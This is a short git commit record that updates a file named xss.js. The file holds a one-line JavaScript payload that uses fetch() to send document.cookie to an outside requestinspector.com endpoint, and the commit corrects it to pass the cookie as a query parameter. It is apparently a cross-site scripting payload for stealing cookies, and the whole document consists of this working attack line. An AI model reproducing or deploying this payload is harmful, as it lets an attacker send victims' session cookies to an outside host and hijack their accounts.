456261b45e4d3388a7d3fba4be4f5e630bafd1ba
vanatka10 <126310360+vanatka10@users.noreply.github.com>
2024-04-18 23:21:45 +0700

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,1 @@
-fetch('https://01hvryajbx8rcdwrptx787s0b000-63adfb6c5299a4aeb0f8.requestinspector.com'+document.cookie)
+fetch('https://01hvryajbx8rcdwrptx787s0b000-63adfb6c5299a4aeb0f8.requestinspector.com?c='+document.cookie)
